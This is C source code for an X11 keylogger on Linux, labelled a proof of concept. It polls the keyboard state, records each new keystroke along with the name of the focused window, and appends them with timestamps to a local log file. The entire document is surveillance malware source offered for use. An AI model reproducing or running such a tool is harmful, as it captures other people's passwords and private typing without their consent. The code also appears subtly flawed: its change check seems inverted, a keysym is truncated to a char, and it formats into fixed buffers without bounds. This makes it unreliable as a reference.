#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <time.h>
#include <X11/Xlib.h>
#include <X11/XKBlib.h>

void log_data(const char * fmt, ...)
{
	FILE *file;
	va_list arg;
	char buf[256];
    char logbuf[256];
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);

    sprintf(logbuf, "[%d-%d-%d %0d:%0d:%0d] ", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
	va_start(arg, fmt);
	vsprintf(buf, fmt, arg);
	va_end(arg);
	strcat(logbuf, buf);

	if ((file = fopen("keys.log", "a+")) != NULL) {
		fputs(logbuf, file);
		fclose(file);
	}
}

int main(int argc, char *argv[])
{
    printf("%s\n%s\n\n", "Linux Keylogger - Proof of Concept", "Logs saved under keys.log");
    
    Display *display;
    Window window = 0;

    char *window_name = '\0';
    char input_key[32];
    char input_key_old[32] = {0};
    char input_key_bit;
    char input_key_bit_old;
    char input_keysym;
    char *input_key_string;

    int bit_check;
    int revert_to;
    int key_code;


    display = XOpenDisplay(NULL);

    if (display == NULL) {
        printf("Cannot open display.");
        return EXIT_FAILURE;
    }

    while (1) {
        XQueryKeymap(display, input_key);

        if (memcmp(input_key, input_key_old, 32) == 0) { // All matching
            for (int i = 0; i < sizeof(input_key); i++) {
                input_key_bit = input_key[i];
                input_key_bit_old = input_key_old[i];
                bit_check = 1;

                for (int j = 0; j < 8; j++) {
                     if ((input_key_bit & bit_check) && !(input_key_bit_old & bit_check)) {
                         key_code = j + i * 8;

                         input_keysym = XkbKeycodeToKeysym(display, key_code, 0, 0);
                         input_key_string = XKeysymToString(input_keysym);

                         XGetInputFocus(display, &window, &revert_to);

                         XFetchName(display, window, &window_name);

                         if (input_key_string != NULL) {
                             printf("Window %x (%s) - Key: %s\n", window, window_name, input_key_string);
                             log_data("Window %x (%s) - Key: %s\n", window, window_name, input_key_string);
                         }
                    }
                    bit_check = bit_check << 1;
                }
            }
        }
        memcpy(input_key_old, input_key, 32);
    }
    XCloseDisplay(display);

    return EXIT_SUCCESS;
}
